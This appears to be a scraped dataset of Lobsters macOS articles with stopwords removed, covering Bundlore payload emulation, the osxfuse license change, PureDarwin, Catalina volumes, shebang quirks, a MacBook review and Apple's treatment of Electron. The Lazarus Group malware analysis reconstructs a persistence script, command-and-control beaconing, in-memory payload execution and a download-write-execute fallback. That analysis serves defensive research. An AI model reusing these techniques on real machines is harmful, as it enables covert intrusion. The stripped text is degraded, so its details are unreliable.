stackstrings pipe saw previously rsi register point address stackstrings fully setup read address stored rsi register start copying hidden python code found address external file tmpdumpedwe use muregread read memory address stored rsi mumemread read data implemented class called bundloreemulation code initializes engine storedhookcode loadbinary abstract method mean customize custom class inheriting bundloreemulation bundloreemulation classthe full python code bundloreemulation class found hereafter create custom class bundloredump inherits bundloreemulation implement hookcode loadbinary code want bundloredump classthe full code bundloredump class downloaded hererunning poc emulation script give u following osxbundlore loader emulation pocand voila hidden python payload dumped tmpdumpedpy lldb python api time without executing code directly cpu testing virtual machine via cpu emulator dumping rest function reconstructing full hidden python code using technique learned proof concept left exercise readerswe hope proof concept give enough input perform task
128,Lobsters,mac,Apple macOS,osxfuse is no longer open source,https://colatkinson.site/macos/fuse/2019/09/29/osxfuse/,osxfuse longer open source,benjamin fleischer bfleischer bfleischer pmetzger pmetzger macports readme license fuse even f use macos much ado signing perfect storm wait pretty gnarly release fucking catalina release mixer summarize better way,fuse macos kernel extension formerly known osxfuse project dating back turn based even older project macfuse linux fuse module even code open sourced apple project open source released amalgamation fairly permissive license various ancestor maintainer benjamin fleischer decided change several release published since binary blob provided leaving fleischer person access complete source previous discussion check choice moment without energy programmer drama tag show empty directory http checking git also produce empty directory archive release page also empty ie http purpose using fuse macos commercial software project feel free contact via email find email github page bfleischer ever written single line kernel code debugged massively parallel file system trust big deal bfleischer simply much work one person addition fulltime job drop let someone else maintain pmetzger right got new season real housewife github said actually pretty serious issue pmetzger maintainer macports every right concerned may also notice linked random github issue mailing list post licensing change noted readme license file obvious ie place people check sort thing get happened first background fuse even fuse stand filesystem userspace name pretty much tell whole story linux kernel module allows developer implement filesystem outside kernel like normal application vastly simplifies development process since access normal library utility use desktop development mainlined way back even new concept notable fuse google drive file stream sshfs keybase kbfs point piece technology used abused endlessly ton project depend macos mentioned earlier since shortly fuse created people wanted filesystems run operating system window bizarrely enough seems get far love dokan dokany winfsp filling void support macos however limited despite fact linux far similar set file operation thanks posix macfuse started google tell abandoned sometime around osxfuse forked around solution running fuse macos since osxfuse necessity kernel module kext apple land using bsd vfs interface present traditional filesystem driver forward filesystem operation across kernel boundary fuse high level operates similarly fuse linux though obviously difference lower level since kext shipping user requires special provision much ado signing may come shock apple really seem like third party developer change anything ux instance added api adding badge icon finder dropbox kept reverse engineering anyway deploying kext requires signed using special kernel extension signing certificate acquired apple getting one cert requires going fairly rigorous application process course end denied real recourse basically project life dy markedly different approach used used linux window approach thirdparty kernel module kicker benjamin fleischer one certificate osxfuse fact google name vast majority result confused user asking prompted installing software ol benny say man celebrity perfect storm quickly summarize osxfuse used ton company essentially none push fix upstream fleischer sole maintainer year also paid penny work also hold magical aluminum unibody certificate prevents people forking module current codebase permissively licensed exactly take rocket surgeon see going wait apple apparently made pretty significant change kernel module upcoming macos catalina according subject matter expert pretty gnarly support fortunately osxfuse support catalina catch go download release notice bit text release note license changed starting release redistribution bundled commercial software allowed without specific prior written permission please contact benjamin fleischer last public source code release two year later short month fucking catalina release mixer fleischer could finally get summarize apple apple thing heavily restricts thirdparty developer fleischer dealt malarkey like close decade realizes get paid enough shit make repo closed source mention anyone making bunch critical change code quietly announces licensing term project different stage proceeding company choice pay tell user use hot new version macos far monetization strategy go love hate got give guy prop probably mentioned code bsdstyle license command line utility actually mount damn thing apple public source license soft copyleft theory change made part code already meet requirement source code distribution lawyer yada yada considered legal advice seems like perfectly board better way many open source project take approach dual licensing gpl seems hit requirement pretty closely noncommercial open source software use module free company individual want distribute software proprietary project pay example space strategy used winfsp possible thing get weird given apple code signing requirement sure strategy would issue fsf lawyer random programmer internet point probably option closing source nothing really mr fleischer come determination keeping project open source situation benefit unfortunate certain point really fault software maintained past eight odd year enormous benefit software community whole instead linuxonly thing fuse became de facto standard quickly spinning filesystem cool useful thing user part due work well work many others course year may come harsh really fleischer take issue first maintainer gripe way labor taken advantage likely last mongo created sspl due similar issue redis lab added clause license forbidding company selling part software osxfuse slightly different domain datastores root cause company often reap far fo sow upstream aside would super cool osxfuse open sourced know see happening near future free open source software movement done amazing thing world respect decision made case certainly hope become new normal meantime consider sending couple buck maintainer favorite project maybe use copyleft license next time release code random company want use finesse cut action isolation might seem like minor issue looked symptom deeper trust big deal
130,Lobsters,mac,Apple macOS,Lazarus Group Goes 'Fileless': an implant w/ remote download & in-memory execution,https://objective-see.com/blog/blog_0x51.html,lazarus group go fileless implant w remote download inmemory execution,cleanmy mac x sample background dineshdevadoss pas applejeus infection vector tweet unioncryptotraderdmg tweet presentation url request analysis persistence whatsyoursign file process blockblock analysis capability lulu writing bad malware o x prsecurity conclusion knockknock patreon art mac malware analysis,lazarus group go fileless implant w remote download inmemory execution december research tool writing supported friend objectivesee cleanmy mac x want play along added sample osxapplejeusc malware collection password infect background today dineshdevadoss posted tweet another lazarus group macos trojan recently written lazarus group first stage implant see pas applejeus intrigued analyze sample see clear overlap new sample contains rather sophisticated capability never seen public macos malware lazarus group recently quite active macos space read past activity see infection vector tweet dinesh kindly provided hash allows u locate sample unioncryptotraderdmg virustotal flagged malicious two engine see unioncryptotraderdmg virustotal url provided dinesh tweet http unioncryptovip spelunking around virustotal gain understanding infection mechanism lazarus group propensity targeting user administrator cryptocurrency exchange de facto method infecting target via fake cryptocurrency company trading application part recent rsa presentation highlighted attack vector specific attack lazarus group created new website unioncryptovip pinging site reveals still online resolving ping unioncryptovip ping unioncryptovip data byte byte m querying virustotal ip address find url request triggered download malicious application http seems reasonable assume lazarus group sticking successful attack vector targeting employee cryptocurrency exchange trojanized trading application analysis persistence let begin analysis trojanzied application said application delivered via disk image named unioncryptotraderdmg mount disk image via hdiutil attach command hdiutil attach downloadsunioncryptotraderdmg expected guidpartitionscheme appleapfs volumesunioncryptotrader contains single package unioncryptotraderpkg l lart volumesunioncryptotrader total rwxrwxrwx patrick staff sep unioncryptotraderpkg via whatsyoursign application easy see unioncryptotraderpkg package unsigned mean macos warn user attempt open taking peek package uncovers postinstall script executed end installation process binsh applicationsunioncryptotraderappcontentsresourcesvipunioncryptoplist librarylaunchdaemonsvipunioncryptoplist librarylaunchdaemonsvipunioncryptoplist libraryunioncrypto applicationsunioncryptotraderappcontentsresourcesunioncryptoupdater libraryunioncryptounioncryptoupdater x libraryunioncryptounioncryptoupdater purpose script persistently install launch daemon specifically script move hidden plist vipunioncryptoplist application resource directory librarylaunchdaemons set owned root create libraryunioncrypto directory move hidden binary unioncryptoupdater application resource directory libraryunioncrypto set executable execute binary libraryunioncryptounioncryptoupdater passively observe part installation via either file process monitor processmonitorappcontentsmacosprocessmonitor pretty event eseventtypenotifyexec process uid argument mv applicationsunioncryptotraderappcontentsresourcesvipunioncryptoplist librarylaunchdaemonsvipunioncryptoplist ppid ancestor signing info csflags signatureidentifier comapplemv cdhash isplatformbinary path binmv pid timestamp event eseventtypenotifyexec process uid argument mv applicationsunioncryptotraderappcontentsresourcesunioncryptoupdater libraryunioncryptounioncryptoupdater ppid ancestor signing info csflags signatureidentifier comapplemv cdhash isplatformbinary path binmv pid timestamp event eseventtypenotifyexec process uid argument libraryunioncryptounioncryptoupdater ppid ancestor signing info csflags signatureidentifier cdhash isplatformbinary path libraryunioncryptounioncryptoupdater pid timestamp though installing launch daemon requires root access installer prompt user credential installer completes binary unioncryptoupdater currently executing persistently installed p aux grep u nioncryptoupdater root libraryunioncryptounioncryptoupdater course blockblock detect launch daemon persistence attempt noted persistence achieved via vipunioncryptoplist launch daemon xml version encoding doctype plist public appledtd plist plist version dict key label key string vipunioncryptoproduct string key programarguments key array string libraryunioncryptounioncryptoupdater string array key runatload key true dict plist runatload key set true instruct macos automatically launch binary specified programarguments array time infected system rebooted libraryunioncryptounioncryptoupdater automatically executed analysis capability ok time analyze persisted unioncryptoupdater binary via file command ascertain standard macos binary file libraryunioncryptounioncryptoupdater libraryunioncryptounioncryptoupdater macho executable codesign utility show u identifier fact signed valid code signing id rather adhoc signatureadhoc codesign dvv libraryunioncryptounioncryptoupdater executablelibraryunioncryptounioncryptoupdater formatmacho thin codedirectory adhoc locationembedded signatureadhoc infoplistnot bound teamidentifiernot set sealed resourcesnone internal requirement running string utility flag reveals interesting string string libraryunioncryptounioncryptoupdater curleasyperform failed encrypt test case decrypt test case encrypt test case decrypt test case encrypt test case decrypt test case input ioplatformexpertdevice ioplatformserialnumber systemlibrarycoreservicessystemversionplist productversion productbuildversion mac o x tmpupdater noid authtimestamp authsignature check http unioncryptovipupdate done binrcp could create image could link image could find ec could resolve symbol sym could resolve symbol sym string ioplatformserialnumber reference systemversionplist likely indicate basic survey capability gather information infected system reference libcurl api curleasyperform embedded url http unioncryptovipupdate indicate networking andor command control capability opening binary unioncryptoupdater disassembler show main function simply invoking function named onrun main rbx objcautoreleasepoolpush onrun objcautoreleasepoolpop rbx return though rather long involved break logic instantiate c class named barbeque barbeque barbeque piping output nm utility cfilt dump method barbeque class nm unioncryptoupdater cfilt unsigned short barbeque barbeque unsigned short barbeque get unsigned short barbeque post unsigned short barbeque barbeque based method name perhaps barbeque class contains network related logic invokes function named getdeviceserial retrieve system serial number via iokit ioplatformserialnumber int kiomasterportdefault rax ioservicematching ioplatformexpertdevice rax ioservicegetmatchingservice rax rax rbx cfstringgetcstring ioregistryentrycreatecfproperty rax ioplatformserialnumber kcfallocatordefault ioobjectrelease rax rax rbx return rax debugging malware vm show method correctly return virtual machine serial number vmnluenmng lldb x rax vmnluenmng invokes function named getosversion order retrieve o version reading system file systemlibrarycoreservicessystemversionplist contains various versionrelated information default read systemlibrarycoreservicessystemversionplist productbuildversion productcopyright apple inc productname mac o x productuservisibleversion productversion iossupportversion debugger observe malware retrieving information specifically productname productuservisibleversion productbuildversion lldb x mac o x build string consisting time hardcode value key ld time sprintf invokes barbeque post method contact remote command control server http unioncryptovipupdate network logic leverage via libcurl perform actual communication rdi curleasyperform firewall lulu easily detects connection attempt server responds string malware sleep minute checking server std basicstring compare rbx sleep goto otherwise invoke function decode server respond followed function named processupdate execute downloaded payload server ok got fairly standard persistent implant beacon remote server likely fullyfeatured implant time remote command control server remains online simply responding meaning payload provided must rely static analysis method remainder analysis however one rather unique aspect implant ability execute received payload directly memory look take closer look malware implement stealthy capability recall server responds payload string malware invokes processupdate function first processupdate decrypts said payload via aesdecryptcbc invokes function named loadfrommemory rdx rcx rbx loadfrommemory rbx rcx loadfrommemory function first mmaps memory protection protread protwrite protexec copy decrypted payload memory region invoking function named loadfrommemory int int int int int int rax mmap rax memcpy rax rax munmap rax rax else rax return rax function invokes apple api nscreateobjectfileimagefrommemory create object file image memory buffer macho file following nslinkmodule method called link object file image int int int rax nscreateobjectfileimagefrommemory rdi rsi rax nslinkmodule core layout inmemory process image different diskin image one simply copy file memory directly execute instead one must invoke apis nscreateobjectfileimagefrommemory nslinkmodule take care preparing inmemory mapping linking malware mapped linked downloaded payload invokes function named findmacho appears search memory mapping mach magic number structure findmacho int int int int error rbx break true findmacho method return malware begin parsing inmemory macho file appears looking address lcmain load command rcx goto lcmain load command contains information entry point macho binary example offset unioncryptoupdater binary malware retrieves offset entry point found offset within lcmain load command set argument jump address point lcmain load command rcx payload entry point delightful pure inmemory execution remotely downloaded payload sexy blackhat discussed method inmemory file execution mean increase stealth complicate forensics see writing bad malware o x neat see finally show macos malware wild detail inmemory code execution macos see prsecurity tweeted also tweeted creating simple poc former obts speaker felix seele noted famous installcore adware also ab used nscreateobjectfileimagefrommemory nslinkmodule apis achieve inmemory execution interestingly malware backup plan inmemory code execution fails specifically loadfrommemory return success write received payload tmpupdater execute via call system loadfrommemory rbx rcx rax fwrite rbx fopen tmpupdater wb fclose rax chmod tmpupdater sprintf tmpupdater rax system unlink tmpupdater always good handle error condition plan b conclusion lazarus group continues target macos user ever evolving capability today analyzed new sample ability remotely download execute payload directly memory good news average mac user worry targeted apt group lazarus moreover installer package unioncryptotraderpkg unsigned macos warn user attempt open however want manually check infected following iocs help launch daemon property list librarylaunchdaemonsvipunioncryptoplist running processbinary libraryunioncryptounioncryptoupdater tool knockknock also uncover infection love blog post andor want support research tool support via patreon page better sign art mac malware analysis class objective sea
131,Lobsters,mac,Apple macOS,A Look at PureDarwin - an OS based on the open source core of macOS,https://www.jamieweb.net/blog/a-look-at-puredarwin/,look puredarwin o based open source core macos,look puredarwin o based open source core macos darwin puredarwinorg darwinbuild brief history darwin o puredarwin xmas booting puredarwin xmas vmware puredarwin beta booting puredarwin beta virtualbox conclusion brief history darwin o rhapsody next xnu cocoa aqua source puredarwin xmas puredarwin xmas released december booting puredarwin xmas vmware fixed version google code repository downloads page puredarwin beta beta booting puredarwin beta virtualbox puredarwin devs site downloads page conclusion wwwpuredarwinorg,look puredarwin o based open source core macos wednesday november puredarwin community project make darwin open source operating system developed apple inc macos built upon usable providing bootable isos documentationthe puredarwinorg homepage showing hexley platypus mascotthe project founded seen informal successor opendarwin project closed puredarwin downstream project darwinbuild combining open source darwin base fo tool xorg produce usable system window maker desktop environment running puredarwin xmas release december skip section look puredarwin o based open source core macos brief history darwin o puredarwin xmas booting puredarwin xmas vmware puredarwin beta booting puredarwin beta virtualbox conclusion brief history darwin o darwin originally released apple november fork rhapsody codename used apple nextgeneration operating system purchase next darwin utilises xnu kernel currently run modern processor well arm processor case older io device eg iphone many wellknown element macos cocoa framework famous aqua graphical user interface included darwin unfortunately remain closed source timeline unixbased operating system showing common ancestor different system source public domain puredarwin project founded create dropin replacement macos instead strives usable implementation darwin remains faithful apple open source core without closed source component pure example use case puredarwin include applecompatible build environment without using official apple hardware facilitate lowlevel testing darwin kernel without limitation macos puredarwin xmas first developer preview release puredarwin called puredarwin xmas released december hence name xmas based darwin corresponds mac o x leopard puredarwin xmas complete operating system featuring desktop environment various gui application however developer preview feature networking hardware support quite limited puredarwin xmas showing application xcalc xclock xterm xfontsel running window maker desktop window manager menu control top left control workspace currently show menu right hand side application launcher button bottom show currently running application minimise restore resize window using available control puredarwin xmas run bash utilises display server us window maker desktop window manager uname yield following darwin puredarwinlocal darwin kernel version thu sep pdt root many commandline gui application come preinstalled puredarwin xmas including xedit nano vim however application firefox openoffice nt work outofthebox due lack driver support missing file primary application menu showing various program tool available puredarwin xmas example basic word processing tool xedit available used write save load document xedit tool new document written window maker environment heavily customised magnification tool included window maker configuration tool magnifier showing zoomedin segment networking support limited puredarwin xmas unfortunately nt supported using vmware workstation player vmware us intel device emulated ethernet controller requires driver driver closed source available redistribution form booting puredarwin xmas vmware puredarwin xmas run virtual machine native intel hardware subject relevant driver support virtualbox nt supported nt possible fully emulate required cpu type however vmware qemu successfully boot puredarwin xmas correct configuration used modern version qemu boot original puredarwin xmas image due incompatibility apple partition map file system used bootloader luckily fixed version released original bootloader transplanted alternate one file system adequately supported qemu mbr case used vmware workstation player puredarwin xmas image distributed primarily vmware virtual machine format order boot puredarwin xmas vmware workstation player following step used download puredarwinxmastarxz google code repository check download checksum extract file yield puredarwinxmasvmwarevm directory download install appropriate version vmware workstation player system downloads page verify download checksum provided open vmware import vmx file puredarwinxmasvmwarevm directory keep directory structure intact configuration file directory required order load nowunsupported mac o server vm profile vmware boot vm puredarwin xmas boot directly desktop modern hardware total boot time around second puredarwin xmas vmware configuration assigns virtual cpu core mb ram comfortably enough run lightweight window maker desktop multiple application puredarwin xmas virtual machine vmware library interestingly vm profile used mac o server nt supported modern version vmware full apple operating system virtualised official apple hardware however vmware vm created much older version vmware profile saved exported configuration still used booting puredarwin xmas latest vmware release generate warning though puredarwin beta time writing latest release puredarwin beta released based darwin corresponds macos high sierra unlike puredarwin xmas beta release lightweightstrippeddown o nt feature full gui display server however much improved driver support modern hardware hypervisors allows basic networking used specific environment bash shell prompt puredarwin beta showing output command hostinfo df h p aux ifconfig beta release run bash uname yield following darwin darwin kernel version mon feb gmt ethan booting puredarwin beta virtualbox unlike puredarwin xmas beta release puredarwin successfully booted modern version virtualbox qemu correct setting used vmware used nt support modern macosesque guest unless running official apple hardware case used virtualbox allow easy configuration relevant setting following step used boot puredarwin beta virtualbox download puredarwin devs site check download checksum extract file yield download install appropriate version virtualbox system either system package manager downloads page verify download checksum provided create new virtual machine using type mac o x macos high sierra without attached disk set chipset mode enable io apic add ide controller mode attach vmdk virtual disk file ide controller boot vm puredarwin beta boot bash shell prompt modern hardware boot time around second common error may encounter virtual machine setting configured correctly documented couple still waiting root device error occurs root file system recognised boot process seems related fact root file system virtual file system within vmdk image rather one created using physical hardware waiting dict id key ioproviderclass key string id ioresources string key ioresourcesmatch key string id bootuuidmedia string dict still waiting root device still waiting root device still waiting root device occur around half way boot process error printed repeatedly puredarwin beta running virtualbox showing still waiting root device error order resolve error ensure virtual disk using ide controller mode chipset mode set shown virtualbox ide disk controller setting virtualbox motherboard setting configured option puredarwin boot successfully macho file bad magic number error occurs try boot puredarwin beta mode currently supported macho file bad magic number decoding kernel failed press key continue puredarwin beta running virtualbox showing bad magic number error ensure virtual machine type virtualbox set either mac o x macos high sierra otherunknown shown virtualbox generalbasic setting done puredarwin beta able boot successfully conclusion overall impressed puredarwin project enjoyed conducting research around achieved lot considering project funded community donation run volunteer definitely nt productionready system developer potential come useful puredarwin team able successfully install macports puredarwin allowing many software package apache httpd git even xfce installed unfortunately nontrivial achieve without strong networking support show potential use case puredarwin please check project wwwpuredarwinorg support work contributing able
132,Lobsters,mac,Apple macOS,macOS Catalina Boot Volume Layout,https://eclecticlight.co/2019/10/08/macos-catalina-boot-volume-layout/,macos catalina boot volume layout,note updated latest roadmaps release article follow october explaining carbon copy cloner catalinasysr catalinasys catalinadatar catalinedata previous article like,note updated latest roadmaps release article follow october explaining upgrade macos catalina boot volume effectively split two assuming standard internal storage existing boot volume renamed macintosh hd data new readonly system volume created given name macintosh hd however mac start catalina see data volume hidden inside system volume apple refers volume group although new macos scheme already use io specifies readonly system volume role apfsvolrolesystem writeable user volume role apfsvolroledata volume system role normally mounted root containing user mutable system data mounted systemvolumes accessed using several firmlinks scheme inode number allocated relative root file directory volume share volume inode number space thus distinguish item located checking volume inode furthermore absolute url path given root directory reveal volume volume group item stored inode number make easy identify firmlinks like hard link two directory forming firmlink identical inode number although directory apfs support directory hard link firmlinks bootable catalina apfs container normally contains least five apfs volume readonly system volume default internal disk named macintosh hd form root boot file system writable data volume default internal disk named macintosh hd data normally hidden view systemvolumes accessed via firmlinks preboot small volume around mb recovery recovery volume around mb vm containing virtual memory cache upwards kb depending use firmlinks similar respect traditional symbolic link made folder work direction little added magic effectively merge content two linked folder example user directory readonly system volume contains directory shared user firmlink directory merged usersshared directory writable data volume similar trick applies application directory user application installed application directory writable volume sipprotected apple apps installed systemapplications resides readonly system volume browse toplevel application folder finder see combination set apps user apps linked using firmlink two volume detail volume group file system magic catalina carbon copy cloner kb article layout standard folder file system volume shown roadmap available pdf catalinasysr want previous version late beta release pdf catalinasys layout standard folder file data volume shown roadmap available pdf catalinadatar want previous version late beta release pdf catalinedata current list firmlinks taken usrsharefirmlinks application application library library systemlibrarycaches systemlibrarycaches systemlibraryassets systemlibraryassets systemlibrarypreinstalledassets systemlibrarypreinstalledassets systemlibrarycoreservicescoretypesbundlecontentslibrary systemlibrarycoreservicescoretypesbundlecontentslibrary systemlibraryspeech systemlibraryspeech user user volume volume core core opt opt private private usrlocal usrlocal usrlibexeccups usrlibexeccups usrsharesnmp usrsharesnmp case shown system volume path data volume path firmlinked changed since late beta one valuable trick always using right path terminal locate folder file finder window drag drop command line macos magically performs path conversion may also find utility precize useful give path inode number great deal detail role purpose folder within home folder please refer back previous article detailing volume layout macos mojave detail given based exploration file system catalina first full release amended utc october release version like like loading related
133,Lobsters,mac,Apple macOS,Two shebang papercuts and a thimble,https://www.crystae.net/posts/2019/11/08/two-shebang-papercuts/,two shebang papercuts thimble,shebang multiple argument shebang papercut usrbinenv shebang papercut thimble reference writeup update,written ruby script mac script demand great performance add enablejit shebang usrbinenv ruby enablejit print hello world test mac program greets everybody record time ship time later user report problem run script seems rather slow fact waited hour one greeted script still work fast machine ask user environment one difference stand using linux spin linux box try script sure enough seems stuck reach strace see spew looping ad nauseam yourbox sudo strace hello execve hello hello var brk null archprctl arch einval invalid argument access etcldsopreload rok enoent file directory openat atfdcwd etcldsocache ordonlyocloexec fstat mmap null protread mapprivate close openat atfdcwd ordonlyocloexec read lseek seekset read lseek seekset read lseek seekset read fstat mmap null protreadprotwrite mapprivatemapanonymous lseek seekset read lseek seekset read lseek seekset read mmap null protread mapprivatemapdenywrite mprotect protnone mmap protreadprotexec mapprivatemapfixedmapdenywrite mmap protread mapprivatemapfixedmapdenywrite mmap protreadprotwrite mapprivatemapfixedmapdenywrite mmap protreadprotwrite mapprivatemapfixedmapanonymous close archprctl archsetfs mprotect protread mprotect protread mprotect protread munmap brk null brk openat atfdcwd usrliblocalelocalearchive ordonlyocloexec fstat mmap null protread mapprivate close execve hello hello var brk null archprctl arch einval invalid argument going script execing seemingly infinite loop really anything else turn come combining two papercuts one applies shebang general another applies invoke usrbinenv multiple argument shebang papercut think shebang usrbinenv ruby enablejit two part interpreter name usrbinenv path script interpreter remainder ruby enablejit among difference shebang linux macos treat remainder differently linux par remainder exactly one argument hello example linux par shebang remainder ruby enablejit combine user argument hello executes usrbinenv argument usrbinenv ruby enablejit hello macos split remainder several argument space hello macos par remainder ruby enablejit executes usrbinenv argument env ruby enablejit hello seems like script would fail linux shebang asking env find run ruby saying something like program found ruby enablejit hanging loop something else afoot usrbinenv shebang papercut first papercut fully explain loopy behavior another papersharp shebang also try pas two argument usrbinenv fails differently linux usrbinenv ruby verbose echo goodbye world yourbox goodbye usrbinenv ruby verbose file directory difference character besides finding first interpreter user path env another use run program modified environment one way take argument form variablevalue program argument set environment variable executed program process instance yourbox env xeyes fg dodgerblue executes xeyes fg dodgerblue shell environment plus environment variable display set combining papercuts linux come execute hello execfamily function read hello content par shebang usrbinenv ruby enablejit parsed shebang combined argv passed exec ultimately execute usrbinenv ruby enablejit hello env par argument set environment variable ruby enable value jit executes program hello goto goodbye fails differently env interprets argument ruby verbose program run since character thimble fortunately modern version env solution macos freebsd support option quote macos manual string split apart given string multiple string process resulting string separate argument env utility option recognizes special character escape sequence also support environment variable substitution described linux gnu coreutils added flag env version released july write fancy optionful shebang like usrbinenv ruby enablejit verbose put hello world hello execute intended reference andries e brouwer posted good writeup shebang behavior many unixish platform update corrected gnu coreutils version added env changed link savannah
134,Lobsters,mac,Apple macOS,"16-Inch MacBook Pro First Impressions: Great Keyboard, Outstanding Speakers",https://daringfireball.net/2019/11/16-inch_macbook_pro_first_impressions,macbook pro first impression great keyboard outstanding speaker,macbook pro first impression great keyboard outstanding speaker try sometimes might find get need macbook pro keyboard concedes everything confessing nothing gaffer tape vim keyboard service program audio new display computery stuff amd radeon pro series gpus conclusion,macbook pro first impression great keyboard outstanding speaker wednesday november try sometimes might find get need apple today released muchrumored new macbook pro full good news yesterday apple held series roundtable briefing medium new york ontherecord introduction followed offtherecord series introduction led macbook pro product manager shruti haldea along senior director mac product marketing tom boger phil schiller attending medium received loaner unit review let even pretend hour enough time proper review enough time establish strong broad impression need know think order importance keyboard got return scissor key mechanism lieu butterfly switch return invertedt arrow key arrangement hardware escape key apple stated explicitly inspiration keyboard magic keyboard ship imacs glance look similar butterflyswitch keyboard previous macbook pro let fool feel completely different full key travel butterfly keyboard good compromise key travel balancing superior feel accuracy travel goal keeping overall device thin new macbook pro fact little thicker previous model overall calling magic keyboard thread impossible marketing needle needed thread concedes everything confessing nothing apple always great keyboard could fit macbook macbook last three year also space key difference much noticeable feel sight making easier feel gap key really make difference like macbook pro model come touch bar even slight improvement nudged top row key help avoid accidental touch haptic feedback functional change touch bar though hard speculate change degree dejonyiveification keyboard outside know exact keyboard might shipped today even jony ive still sure know anyone though would disagree last year apple balance thing work versus thing look veered problematically toward making thing look better hardware software expense function allow fixate one particular detail arrow key reason switch classic upsidedown arrangement fullsize left right arrow key make keyboard look better upsidedown arrangement gap left right arrow look little funny abstract gap serve huge functional purpose make much easier put finger key without looking keyboard gap give something feel used recent macbook family keyboard month time past year arrow key arrangement biggest annoyance far lowtravel key missing hardware escape button narrow gap key could never get used gap arrow key layout resorted putting small strip gaffer tape lower half left right key something feel apple emphasized yesterday presentation butterflyswitch keyboard problematic unpopular still include every macbook new model even eventually switch whole lineup new keyboard think course asked comment future product apple style throw one old product proverbial bus apple emphasized simply listened complaint professional macbook user recognized important escape key developer even mentioned vim name developer tool demo emphasized studied make good keyboard reduces mistake increase efficiency throw away good part butterfly keyboard including excellent backlighting especially increased stability key go flat even pressed offcenter key keyboard wobble like key macbook pro keyboard typing quiet new keyboard sound make satisfying le clickity chunkity short apple simply go back old style keyboard new design best attribute old keyboard recent butterflyswitch keyboard lastly apple seems confident new keyboard design durable reliable new macbook pro covered apple keyboard service program apparently need expected apple correct mistake previous keyboard feared stubborn pride plain bad taste keyboard design bit frustrating took three year modern macbook keyboard like along audio keyboard reboot saw coming one new macbook pro radically improved builtin speaker audio equivalent going chunky pixel retina display big difference simply louder although louder maximum volume sound impossibly better merely sound like good laptop speaker sound like good dedicated portable speaker period small room credibly use macbook pro play music though entertainment speaker system maximum volume really lot louder without sort distortion come expect laptop speaker high volume apple demo pitted new macbook pro highend model dell razer think hp embarrassing comparison course see apple demo compared new macbook pro laptop competitor difference stark compared macbook pro addition sounding holyshitican tbelievethesearelaptopspeakers better new speaker also vibrate le volume high laptop speaker including apple pump audio keyboard feel whole machine vibrate finger key much new macbook pro even volume pumped way apple credit forcecanceling woofer speaker driver paired backtoback emitting sound cancel physical force creates vibration distorted sound provide real bass amazing acoustic engineering led homepod airpods pro starting pay dividend every product apple make speaker iphone ipad speaker gotten really good product steady improvement year year recall one single iphone ipad difference sound quality previous generation significant really think anything write convince good speaker sound however good think saying sound sound way better audio input improved well macbook pro new array apple describes studio quality claim credibly use record podcast bold claim new threemicrophone array certainly sound noticeably better old builtin microphone sample recorded last night desk basement usually record podcast macbook pro new macbook pro iphone pro shure beta microphone connected onyx blackjack xlr interface setup use show would recommend new builtin macbook pro microphone recording podcast would willing use show pinch yes great improvement audio teleconferencing facetime new display new display native resolution pixel density pixel per inch old retina display pixel density pixel per inch apple use number pixel make pixel bigger actually made pixel slightly smaller added make bigger display brightness color gamut unchanged rounded corner like ipad pro iphone display still good oldfashioned rectangle pure corner computery stuff macbook pro new big macbook pro replaces previous macbook pro lineup price base model base model intel chip one available may macbook pro go apple switch chip mac still best laptop chip intel make bit unusual say least major update flagship macbook us cpu generation replacing performance improvement allnew thermal system mean chip run peak performance longer graphic faster debut amd radeon pro series gpus base model come gb faster ram configured gb apple also offer tb ssd storage believe first tb ssd market port situation unchanged four thunderbolt usbc port two side headphone jack macbook pro slightly larger footprint old model slightly heavier v pound mentioned slightly thicker v cm hand use effectively feel size macbook pro conclusion feel bit silly excited classic arrow key layout hardware escape key key switch function reliably feel good type risk mac user captive single company whim one would ever suggest steering wheel car designed people drive yet somehow entire macintosh world spent last three year dealing avoiding keyboard seemingly designed people whole saga butterfly keyboard unreliable switch poor typing feel antifunctional layout betrays certain arrogance powerful organization corporation nation sport team whatever risk organization hubris power allows one act hubris celebrating return longstanding feature never lost first place apple willingness revisit decision explicit acknowledgment yes keyboard meant typed upon gazed upon cause party least cause jubilant toast macbook argue best laptop hardware money buy
135,Lobsters,mac,Apple macOS,Apple Is Trying to Kill Web Technology,https://onezero.medium.com/apple-is-trying-to-kill-web-technology-a274237c174d,apple trying kill web technology,apple trying kill web technology company made extremely difficult use webbased technology platform hope developer bother recent policy change discussion ban drastically improve power usage notarization requirement apple allow fully independent thirdparty browser open web specification implement specification embedded inside apps partially implementing competing framework called catalyst plan exert control,apple trying kill web technologythe company made extremely difficult use webbased technology platform hope developer bothercredit sopa imagesgetty imagesthe programming language used build web often find way apps largely due software allows developer reuse code write web product build run operating system like linux android window macosbut apple reason like recycling web technology want mac app store filled apps find anywhere else apps available every platform recent policy change company made little difficult developer submit apps containing web codethe mac app store quietly started rejecting apps made popular tool called electron allows developer base apps webbased code popular apps app store like slack spotify discord whatsapp fall categoryin discussion programming community github several developer say rejection apps built using electron would approved past came explanation apps attempt hide use private apis apis built apple internal usage rather thirdparty developer using private apis build publicfacing apps commonly frowned upon may change break time apple ban apps use themelectron used private apis year without issue private apis allow developer instance drastically improve power usage whereas apple sanctioned tool make user experience worse majority case apple provide real alternative developer want access private api featuresnow unlikely thousand developer built apps using electron release update unless electron framework release major change implementationdevelopers could distribute apps website asking user download directly mean abandoning feature like apple autoupdate mechanism mac app store icloud sync directtoconsumer method could soon locked apple controversial notarization requirement potentially requiring reviewapple history stunting web progress platform io apple allow fully independent thirdparty browser requiring apps leverage safari browser rendering webbased content browser like chrome opera available app store must use apple safari browser behind scene render web page rather mean apple monopoly iphone ipad user access web push developer toward building native apps io rather using web technology apple ignores popular part open web specification browser implement benefitapple subtle anticompetitive practice look terrible isolation together form clear strategya technology called webrtc example allows video calling web browser without additional software power tool like google meet apple incredibly slow implement specification leaving key piece functionality technology work embedded inside appsapple also handicapped emerging standard called progressive web apps pwas like electron allows developer build nativelike apps desktop mobile partially implementing way make inconsistent rely pwa problem user open apps chrome firefox iphone ipad user install thirdparty browser make pwabased technology nonstarterdevelopers use technology like electron pwa allow faster update across platform without array different codebases argue result lower quality apps argue alternative app apps rarely updated maintaining unique window mac webbased product complex expensive apple recently launched competing framework called catalyst allows developer ipad apps bring macos quickly great tool developer exclusively targeting apple user building crossplatform appsapple subtle anticompetitive practice look terrible isolation together form clear strategy make painful build webbased technology apple platform developer bother app store accepting apps built using electron developer likely find creative way work around apple setting continual catandmouse game plan exert control apps run platform futurethese type change may made name privacy security reality argument look weak user developer simply choice apple control platform browser engine distribution method regardless opinion electron app quality choice importantapple control app ecosystem new type monopoly hard understand lawmaker difficult u fight back simply way restriction company control distribution method platform
